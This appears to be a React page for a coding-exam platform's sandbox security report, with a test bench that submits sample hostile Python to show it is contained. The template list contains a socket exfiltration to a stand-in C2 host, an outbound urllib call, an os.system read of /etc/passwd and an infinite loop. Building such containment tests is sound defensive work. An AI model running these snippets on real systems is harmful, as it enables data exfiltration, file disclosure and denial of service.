import { useState, useEffect } from 'react'
import {
  ShieldAlert,
  ShieldCheck,
  Lock,
  Cpu,
  Globe,
  Terminal,
  AlertTriangle,
  Play,
  RotateCw,
  CheckCircle2,
  FileCode,
  Flame,
  Bug,
  Server,
} from 'lucide-react'
import { api } from '@/api'
import type { SandboxSecurityReport } from '@/types'
import { Card, CardBody, CardHeader } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'

const EXPLOIT_TEMPLATES = [
  {
    id: 'loop',
    name: 'Infinite Loop (CPU Starvation DoS)',
    icon: Flame,
    color: 'rose',
    code: `def two_sum(nums, target):
    # Hostile CPU exhaustion attack
    counter = 0
    while True:
        counter += 1  # Infinite loop designed to freeze backend runner
`,
    expected: 'Watchdog SIGKILL triggered at 2.5s timeout. Zero thread lockup.',
  },
  {
    id: 'socket',
    name: 'Network Egress (Raw Socket Reverse Shell)',
    icon: Globe,
    color: 'amber',
    code: `import socket

def two_sum(nums, target):
    # Hostile outbound socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker-c2.darkweb.net", 4444))
    s.send(b"EXFILTRATE_DATA")
    return [0, 1]
`,
    expected: 'AST static validation rejects import before execution. Zero socket spawned.',
  },
  {
    id: 'requests',
    name: 'HTTP Exfiltration (Urllib / Web Request)',
    icon: Bug,
    color: 'purple',
    code: `import urllib.request

def two_sum(nums, target):
    # Attempt to transmit student exam answers to external server
    urllib.request.urlopen("https://api.external-cheat-server.com/solve?p=two_sum")
    return [0, 1]
`,
    expected: 'Network module blocked by security whitelist. Egress completely restricted.',
  },
  {
    id: 'fs',
    name: 'Filesystem / Subprocess Shell Injection',
    icon: Lock,
    color: 'red',
    code: `import os

def two_sum(nums, target):
    # Attempt to inspect server environment variables and root directory
    os.system("cat /etc/passwd || dir C:\\\\")
    return [0, 1]
`,
    expected: 'AST inspects forbidden module "os". Subprocess blocked before fork.',
  },
]

export function SandboxSecurityReportPage() {
  const [report, setReport] = useState<SandboxSecurityReport | null>(null)
  const [loading, setLoading] = useState(true)
  const [selectedExploit, setSelectedExploit] = useState(EXPLOIT_TEMPLATES[0])
  const [exploitCode, setExploitCode] = useState(EXPLOIT_TEMPLATES[0].code)
  const [firing, setFiring] = useState(false)
  const [liveResult, setLiveResult] = useState<any>(null)

  const fetchReport = async () => {
    try {
      const res = await api.getSecurityReport()
      setReport(res)
    } catch (err) {
      console.error('Failed to fetch security report:', err)
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
    fetchReport()
  }, [])

  const handleSelectTemplate = (tmpl: typeof EXPLOIT_TEMPLATES[0]) => {
    setSelectedExploit(tmpl)
    setExploitCode(tmpl.code)
    setLiveResult(null)
  }

  const handleFireExploit = async () => {
    setFiring(true)
    setLiveResult(null)
    const startTime = performance.now()
    try {
      const res = await api.submitCode(
        's1',
        'prob_two_sum',
        exploitCode,
        'python',
        { paste_count: 0, time_spent_seconds: 5, tab_switches: 0 }
      )
      const elapsed = Math.round(performance.now() - startTime)
      setLiveResult({
        ...res,
        total_time_ms: elapsed,
      })
      // Refresh historical log
      await fetchReport()
    } catch (err: any) {
      setLiveResult({
        status: 'Security Error',
        error: err.message || 'Contained by Sandbox Guard',
      })
    } finally {
      setFiring(false)
    }
  }

  return (
    <div className="flex flex-col gap-6 max-w-7xl mx-auto pb-12">
      {/* Headline Header */}
      <div className="relative overflow-hidden rounded-2xl border border-red-500/30 bg-gradient-to-r from-surface via-red-950/20 to-surface p-6 shadow-2xl backdrop-blur-xl">
        <div className="absolute -top-12 -right-12 size-48 rounded-full bg-rose-500/10 blur-3xl pointer-events-none" />
        <div className="relative z-10 flex flex-col md:flex-row md:items-center justify-between gap-6">
          <div className="space-y-2">
            <div className="flex items-center gap-2.5">
              <span className="flex items-center gap-1.5 rounded-full bg-rose-500/20 px-3 py-1 text-xs font-bold text-rose-300 border border-rose-500/30">
                <ShieldAlert className="size-3.5" />
                SANDBOX SECURITY VERIFICATION
              </span>
              <span className="rounded-full bg-emerald-500/20 px-2.5 py-0.5 text-xs font-medium text-emerald-400 border border-emerald-500/30">
                Zero Escape Rate
              </span>
            </div>
            <h1 className="text-2xl md:text-3xl font-extrabold tracking-tight text-ink flex items-center gap-3">
              Sandbox Security Report & Containment Proof
            </h1>
            <p className="text-sm md:text-base text-muted max-w-3xl leading-relaxed">
              Proof that untrusted code submitted by examinees is contained. Infinite loops are halted via timed SIGKILL, and raw network calls (sockets, urllib) are rejected before execution via AST pre-screening.
            </p>
          </div>

          <div className="flex items-center gap-2 shrink-0">
            <button
              onClick={fetchReport}
              className="inline-flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold border border-white/10 bg-surface-hover hover:border-white/20 transition-all text-muted hover:text-foreground cursor-pointer"
            >
              <RotateCw className="size-3.5" />
              Refresh Security Telemetry
            </button>
          </div>
        </div>
      </div>

      {/* Security Stat Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <div className="p-4 rounded-xl border border-border bg-surface/70 backdrop-blur-md shadow-sm">
          <div className="flex items-center justify-between text-muted mb-2">
            <span className="text-xs font-bold uppercase tracking-wider">Total Threats Contained</span>
            <ShieldCheck className="size-4 text-emerald-400" />
          </div>
          <div className="text-2xl font-extrabold text-foreground">
            {report ? report.total_contained_threats : 2}
          </div>
          <p className="text-xs text-emerald-400/90 mt-1 flex items-center gap-1">
            <CheckCircle2 className="size-3" /> 100% Contained & Logged
          </p>
        </div>

        <div className="p-4 rounded-xl border border-border bg-surface/70 backdrop-blur-md shadow-sm">
          <div className="flex items-center justify-between text-muted mb-2">
            <span className="text-xs font-bold uppercase tracking-wider">Network Calls Blocked</span>
            <Globe className="size-4 text-amber-400" />
          </div>
          <div className="text-2xl font-extrabold text-foreground">
            {report ? report.network_attempts_blocked : 1}
          </div>
          <p className="text-xs text-muted mt-1">
            Zero external socket egress
          </p>
        </div>

        <div className="p-4 rounded-xl border border-border bg-surface/70 backdrop-blur-md shadow-sm">
          <div className="flex items-center justify-between text-muted mb-2">
            <span className="text-xs font-bold uppercase tracking-wider">Infinite Loops Terminated</span>
            <Cpu className="size-4 text-rose-400" />
          </div>
          <div className="text-2xl font-extrabold text-foreground">
            {report ? report.infinite_loops_terminated : 1}
          </div>
          <p className="text-xs text-muted mt-1">
            Watchdog timeout: 2.5s SIGKILL
          </p>
        </div>

        <div className="p-4 rounded-xl border border-border bg-surface/70 backdrop-blur-md shadow-sm">
          <div className="flex items-center justify-between text-muted mb-2">
            <span className="text-xs font-bold uppercase tracking-wider">Sandbox Engine Status</span>
            <Server className="size-4 text-primary" />
          </div>
          <div className="text-sm font-bold text-emerald-400 truncate">
            ISOLATED SUBPROCESS
          </div>
          <p className="text-xs text-muted mt-1">
            AST Screen + Isolated Worker
          </p>
        </div>
      </div>

      {/* Interactive Exploit Demonstration Console */}
      <div className="rounded-2xl border border-border bg-surface/60 backdrop-blur-md p-6 shadow-xl">
        <div className="flex items-center justify-between mb-4">
          <div>
            <h2 className="text-base font-bold text-foreground flex items-center gap-2">
              <Terminal className="size-4 text-primary" />
              Live Hostile Submission Test Bench
            </h2>
            <p className="text-xs text-muted">
              Select an exploit payload below and fire it directly into the sandbox to witness containment live.
            </p>
          </div>
        </div>

        {/* Exploit Template Selector */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5 mb-4">
          {EXPLOIT_TEMPLATES.map((tmpl) => {
            const Icon = tmpl.icon
            const isSelected = selectedExploit.id === tmpl.id
            return (
              <button
                key={tmpl.id}
                onClick={() => handleSelectTemplate(tmpl)}
                className={`flex items-start gap-2.5 p-3 rounded-xl border text-left transition-all cursor-pointer ${
                  isSelected
                    ? 'border-primary bg-primary/10 shadow-md ring-1 ring-primary/30'
                    : 'border-white/10 bg-surface/50 hover:bg-white/5 hover:border-white/20'
                }`}
              >
                <div className={`size-7 rounded-lg flex items-center justify-center shrink-0 ${
                  isSelected ? 'bg-primary text-white' : 'bg-white/5 text-muted'
                }`}>
                  <Icon className="size-3.5" />
                </div>
                <div className="min-w-0">
                  <p className="text-xs font-bold text-foreground truncate">{tmpl.name}</p>
                  <p className="text-[11px] text-muted truncate mt-0.5">{tmpl.expected}</p>
                </div>
              </button>
            )
          })}
        </div>

        {/* Code Editor & Execution Results */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          {/* Payload Editor */}
          <div className="flex flex-col gap-2">
            <div className="flex items-center justify-between text-xs text-muted px-1">
              <span className="font-mono">Payload: Python Sandboxed Code</span>
              <span className="text-amber-400 font-semibold">{selectedExploit.name}</span>
            </div>
            <textarea
              value={exploitCode}
              onChange={(e) => setExploitCode(e.target.value)}
              rows={8}
              className="w-full font-mono text-xs p-3 rounded-xl border border-white/10 bg-black/60 text-emerald-300 focus:outline-none focus:border-primary resize-none shadow-inner leading-relaxed"
            />
            <div className="flex items-center justify-between mt-1">
              <span className="text-xs text-muted">
                Containment expected: <strong className="text-foreground">{selectedExploit.expected}</strong>
              </span>
              <button
                onClick={handleFireExploit}
                disabled={firing}
                className="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl font-bold text-xs bg-gradient-to-r from-rose-600 to-red-600 text-white shadow-lg shadow-rose-600/30 hover:shadow-rose-600/50 hover:brightness-110 active:scale-95 transition-all cursor-pointer disabled:opacity-50"
              >
                {firing ? (
                  <>
                    <RotateCw className="size-3.5 animate-spin" />
                    Executing in Sandbox...
                  </>
                ) : (
                  <>
                    <Play className="size-3.5 fill-white" />
                    Fire Hostile Submission
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Containment Verdict Screen */}
          <div className="rounded-xl border border-white/10 bg-black/40 p-4 flex flex-col justify-between">
            <div>
              <div className="flex items-center justify-between pb-3 border-b border-white/10 mb-3">
                <span className="text-xs font-bold uppercase tracking-wider text-muted">
                  Sandbox Containment Output
                </span>
                {liveResult ? (
                  liveResult.status === 'Accepted' ? (
                    <span className="px-2 py-0.5 rounded text-[11px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                      Normal Code (Accepted)
                    </span>
                  ) : (
                    <span className="px-2 py-0.5 rounded text-[11px] font-bold bg-rose-500/20 text-rose-300 border border-rose-500/30 flex items-center gap-1">
                      <ShieldCheck className="size-3" />
                      Hostile Code Contained
                    </span>
                  )
                ) : (
                  <span className="text-xs text-muted">Awaiting submission</span>
                )}
              </div>

              {firing ? (
                <div className="flex flex-col items-center justify-center py-10 gap-3 text-muted">
                  <RotateCw className="size-6 animate-spin text-primary" />
                  <p className="text-xs font-mono">Sandbox subprocess active... applying watchdog timers...</p>
                </div>
              ) : liveResult ? (
                <div className="space-y-3">
                  <div className="flex items-center justify-between text-xs font-mono bg-white/5 p-2 rounded-lg">
                    <span className="text-muted">Status:</span>
                    <span className="font-bold text-rose-400">{liveResult.status}</span>
                  </div>
                  <div className="flex items-center justify-between text-xs font-mono bg-white/5 p-2 rounded-lg">
                    <span className="text-muted">Elapsed Time:</span>
                    <span className="text-foreground">{liveResult.runtime_ms || liveResult.total_time_ms} ms</span>
                  </div>
                  <div className="p-3 rounded-lg border border-rose-500/30 bg-rose-950/20 text-xs font-mono text-rose-200">
                    <div className="font-bold text-rose-300 mb-1 flex items-center gap-1.5">
                      <Lock className="size-3.5" />
                      Containment Mechanism Fired:
                    </div>
                    {liveResult.test_results?.[0]?.error || liveResult.error || 'Hostile execution rejected by sandbox barrier.'}
                  </div>
                </div>
              ) : (
                <div className="flex flex-col items-center justify-center py-10 gap-2 text-muted">
                  <Terminal className="size-6 text-muted/50" />
                  <p className="text-xs">Click "Fire Hostile Submission" to view immediate containment proof.</p>
                </div>
              )}
            </div>

            <div className="pt-3 border-t border-white/10 text-[11px] text-muted flex items-center justify-between">
              <span>Security Event Auto-Logged</span>
              <span className="text-emerald-400 font-mono">Status 200 OK</span>
            </div>
          </div>
        </div>
      </div>

      {/* Historical Security Events Audit Log */}
      <div className="rounded-2xl border border-border bg-surface/60 backdrop-blur-md p-6 shadow-xl">
        <div className="flex items-center justify-between mb-4">
          <div>
            <h3 className="text-base font-bold text-foreground flex items-center gap-2">
              <ShieldAlert className="size-4 text-rose-400" />
              Containment Event Log (Audit Proof)
            </h3>
            <p className="text-xs text-muted">
              Immutable ledger of intercepted hostiles, resource exhaustion terminations, and network egress blocks.
            </p>
          </div>
          <span className="text-xs text-muted font-mono">
            {report?.recent_events?.length || 0} Events Recorded
          </span>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs">
            <thead className="border-b border-white/10 text-muted uppercase font-bold tracking-wider">
              <tr>
                <th className="py-2.5 px-3">Timestamp</th>
                <th className="py-2.5 px-3">Student</th>
                <th className="py-2.5 px-3">Threat Category</th>
                <th className="py-2.5 px-3">Containment Action</th>
                <th className="py-2.5 px-3">Description</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/5 font-mono">
              {report?.recent_events && report.recent_events.length > 0 ? (
                report.recent_events.map((ev) => (
                  <tr key={ev.id} className="hover:bg-white/5 transition-colors">
                    <td className="py-3 px-3 text-muted whitespace-nowrap">
                      {new Date(ev.occurred_at).toLocaleTimeString()}
                    </td>
                    <td className="py-3 px-3 text-foreground font-sans font-semibold">
                      {ev.student_name}
                    </td>
                    <td className="py-3 px-3">
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                        ev.event_type.includes('network')
                          ? 'bg-amber-500/20 text-amber-300 border border-amber-500/30'
                          : ev.event_type.includes('timeout')
                          ? 'bg-rose-500/20 text-rose-300 border border-rose-500/30'
                          : 'bg-red-500/20 text-red-300 border border-red-500/30'
                      }`}>
                        {ev.event_type}
                      </span>
                    </td>
                    <td className="py-3 px-3 text-emerald-400">
                      {ev.containment_action}
                    </td>
                    <td className="py-3 px-3 text-muted max-w-md truncate" title={ev.description}>
                      {ev.description}
                    </td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan={5} className="py-6 text-center text-muted">
                    No security events logged yet. Submit an infinite loop or network call to test.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  )
}
